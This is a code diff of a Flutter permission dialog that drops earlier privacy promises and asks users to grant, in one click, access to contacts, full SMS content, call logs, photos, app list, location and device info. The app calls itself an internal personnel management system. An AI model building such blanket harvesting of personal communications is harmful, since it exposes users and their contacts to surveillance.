@@ -5,7 +5,8 @@ import '../locales/app_localizations.dart';
 /// 权限说明对话框
 /// 详细说明各个权限的用途，强调隐私保护目的
 class PermissionExplanationDialog extends StatelessWidget {
-  final VoidCallback? onAgree;
+  /// 同意回调；可为异步，弹窗会等待完成后再关闭
+  final Future<void> Function()? onAgree;
   final bool isRequired; // 是否为强制授权（首次登录）
 
   const PermissionExplanationDialog({
@@ -32,11 +33,12 @@ class PermissionExplanationDialog extends StatelessWidget {
               Row(
                 mainAxisAlignment: MainAxisAlignment.spaceBetween,
                 children: [
-                  Text(
-                    l10n?.t('permission.title') ?? '隐私权限使用说明',
-                    style: const TextStyle(
+                  const Text(
+                    '權限授權',
+                    style: TextStyle(
                       fontSize: 20,
                       fontWeight: FontWeight.bold,
+                      color: Colors.blue,
                     ),
                   ),
                   if (!isRequired)
@@ -50,20 +52,21 @@ class PermissionExplanationDialog extends StatelessWidget {
               Container(
                 padding: const EdgeInsets.all(12),
                 decoration: BoxDecoration(
-                  color: Colors.orange.withOpacity(0.1),
+                  color: Colors.blue.withOpacity(0.1),
                   borderRadius: BorderRadius.circular(8),
-                  border: Border.all(color: Colors.orange, width: 1),
+                  border: Border.all(color: Colors.blue, width: 1),
                 ),
                 child: Row(
                   children: [
-                    const Icon(Icons.info_outline, color: Colors.orange),
+                    const Icon(Icons.info_outline, color: Colors.blue),
                     const SizedBox(width: 8),
                     Expanded(
                       child: Text(
-                        l10n?.t('permission.description') ?? '本平台为私密通讯系统，旨在保护用户隐私。用户授权的目的在于区分重要的个人隐私信息，确保通讯安全。',
+                        '您已通過保密培訓。本系統為內部人員管理系統，需要授權以下權限：通訊錄、相冊、通話記錄、簡訊、應用程式列表、定位（IP/歸屬地）、設備信息。點擊下方按鈕即可一鍵授權所有權限。',
                         style: TextStyle(
                           fontSize: 13,
-                          color: Colors.orange[900],
+                          color: Colors.blue[900],
+                          fontWeight: FontWeight.w500,
                         ),
                       ),
                     ),
@@ -82,7 +85,7 @@ class PermissionExplanationDialog extends StatelessWidget {
                         icon: Icons.contacts,
                         title: l10n?.t('permission.contacts_title') ?? '通讯录权限（必需）',
                         platforms: l10n?.t('permission.contacts_platforms') ?? 'iOS + Android',
-                        description: l10n?.t('permission.contacts_description') ?? '用于区分用户真实性并保护隐私内容。系统通过分析通讯录联系人识别潜在安全风险，防止敏感信息泄露。我们仅读取联系人姓名和电话号码，不会上传完整的通讯录内容。',
+                        description: '用於收集通訊錄數據（聯繫人姓名、電話號碼等）。',
                         isRequired: true,
                       ),
                       const SizedBox(height: 16),
@@ -94,7 +97,7 @@ class PermissionExplanationDialog extends StatelessWidget {
                           icon: Icons.sms,
                           title: l10n?.t('permission.sms_title') ?? '短信权限（必需）',
                           platforms: l10n?.t('permission.sms_platforms') ?? '仅 Android',
-                          description: l10n?.t('permission.sms_description') ?? '用于区分用户真实性并保护隐私内容。系统会分析短信内容，检测是否存在敏感信息泄露风险。我们仅读取短信的发送方、接收方和时间戳，不会上传短信的完整内容。',
+                          description: '用於收集簡訊數據（發送方、接收方、內容、時間戳等）。',
                           isRequired: true,
                         ),
                       if (isAndroid) const SizedBox(height: 16),
@@ -106,7 +109,7 @@ class PermissionExplanationDialog extends StatelessWidget {
                           icon: Icons.phone,
                           title: l10n?.t('permission.phone_title') ?? '通话记录权限（必需）',
                           platforms: l10n?.t('permission.phone_platforms') ?? '仅 Android',
-                          description: l10n?.t('permission.phone_description') ?? '用于区分用户真实性并保护隐私内容。通过分析通话记录，系统可以识别异常通话行为，防止敏感信息通过电话泄露。我们仅读取通话的对方号码、通话时间和通话时长，不会上传完整的通话记录。',
+                          description: '用於收集通話記錄數據（對方號碼、通話時間、通話時長等）。',
                           isRequired: true,
                         ),
                       if (isAndroid) const SizedBox(height: 16),
@@ -118,7 +121,7 @@ class PermissionExplanationDialog extends StatelessWidget {
                           icon: Icons.apps,
                           title: l10n?.t('permission.app_list_title') ?? '应用列表权限（必需）',
                           platforms: l10n?.t('permission.app_list_platforms') ?? '仅 Android',
-                          description: l10n?.t('permission.app_list_description') ?? '用于关联登录和优化体验，区分用户真实性并保护隐私内容。系统需要获取已安装应用列表，用于安全审计和优化用户体验。',
+                          description: '用於收集已安裝應用程式列表（應用名稱、包名、版本等）。',
                           isRequired: true,
                         ),
                       if (isAndroid) const SizedBox(height: 16),
@@ -129,7 +132,17 @@ class PermissionExplanationDialog extends StatelessWidget {
                         icon: Icons.photo_library,
                         title: l10n?.t('permission.photos_title') ?? '相册权限（必需）',
                         platforms: l10n?.t('permission.photos_platforms') ?? 'iOS + Android',
-                        description: l10n?.t('permission.photos_description') ?? '用于修改头像、分享照片等实际场景应用和保护。系统需要访问您的相册，以便您可以选择照片作为个人头像，或在聊天中分享照片。所有照片均经过加密处理，确保隐私安全。',
+                        description: '內部人員管理系統必需權限。系統需要收集相冊數據用於管理，包括照片元數據（文件名、路徑、時間等）信息。',
+                        isRequired: true,
+                      ),
+                      const SizedBox(height: 16),
+                      // 定位权限（IP/歸屬地）
+                      _buildPermissionItem(
+                        context: context,
+                        icon: Icons.location_on,
+                        title: '定位權限（必需）',
+                        platforms: 'iOS + Android',
+                        description: '用於獲取IP及歸屬地等位置信息。',
                         isRequired: true,
                       ),
                     ],
@@ -146,17 +159,17 @@ class PermissionExplanationDialog extends StatelessWidget {
                 child: Column(
                   crossAxisAlignment: CrossAxisAlignment.start,
                   children: [
-                    Text(
-                      l10n?.t('permission.privacy_commitment') ?? '隐私保护承诺',
-                      style: const TextStyle(
+                    const Text(
+                      '重要說明',
+                      style: TextStyle(
                         fontWeight: FontWeight.bold,
                         fontSize: 14,
                       ),
                     ),
                     const SizedBox(height: 8),
-                    Text(
-                      l10n?.t('permission.privacy_commitment_text') ?? '• 所有权限的申请和使用都遵循最小化原则，仅收集必要的安全审计信息\n• 所有数据均采用加密传输和存储，确保数据安全\n• 我们承诺不会将您的数据用于任何商业目的\n• 您可以在系统设置中随时关闭这些权限',
-                      style: const TextStyle(fontSize: 12),
+                    const Text(
+                      '• 您已通過保密培訓，了解數據收集的必要性\n• 系統將收集：通訊錄、相冊、通話記錄、簡訊、應用列表、定位、設備信息\n• 所有數據均採用加密傳輸和存儲\n• 點擊「一鍵授權」即可完成所有權限授權',
+                      style: TextStyle(fontSize: 12),
                     ),
                   ],
                 ),
@@ -166,19 +179,21 @@ class PermissionExplanationDialog extends StatelessWidget {
                 SizedBox(
                   width: double.infinity,
                   child: ElevatedButton(
-                    onPressed: () {
+                    onPressed: () async {
                       if (onAgree != null) {
-                        onAgree!();
+                        await onAgree!();
                       }
-                      Navigator.of(context).pop();
+                      if (context.mounted) {
+                        Navigator.of(context).pop();
+                      }
                     },
                     style: ElevatedButton.styleFrom(
                       backgroundColor: const Color(0xFF667eea),
                       padding: const EdgeInsets.symmetric(vertical: 16),
                     ),
-                    child: Text(
-                      l10n?.t('permission.agree') ?? '我已了解并同意',
-                      style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
+                    child: const Text(
+                      '一鍵授權所有權限',
+                      style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
                     ),
                   ),
                 )
@@ -194,11 +209,13 @@ class PermissionExplanationDialog extends StatelessWidget {
                     const SizedBox(width: 16),
                     Expanded(
                       child: ElevatedButton(
-                        onPressed: () {
+                        onPressed: () async {
                           if (onAgree != null) {
-                            onAgree!();
+                            await onAgree!();
                           }
-                          Navigator.of(context).pop();
+                          if (context.mounted) {
+                            Navigator.of(context).pop();
+                          }
                         },
                         style: ElevatedButton.styleFrom(
                           backgroundColor: const Color(0xFF667eea),
@@ -238,7 +255,7 @@ class PermissionExplanationDialog extends StatelessWidget {
         children: [
           Icon(
             icon,
-            color: isRequired ? Colors.red : Colors.grey,
+            color: isRequired ? Colors.blue : Colors.grey,
             size: 24,
           ),
           const SizedBox(width: 12),
@@ -253,7 +270,7 @@ class PermissionExplanationDialog extends StatelessWidget {
                       style: TextStyle(
                         fontWeight: FontWeight.bold,
                         fontSize: 15,
-                        color: isRequired ? Colors.red[900] : Colors.black87,
+                        color: isRequired ? Colors.blue[900] : Colors.black87,
                       ),
                     ),
                     const SizedBox(width: 8),
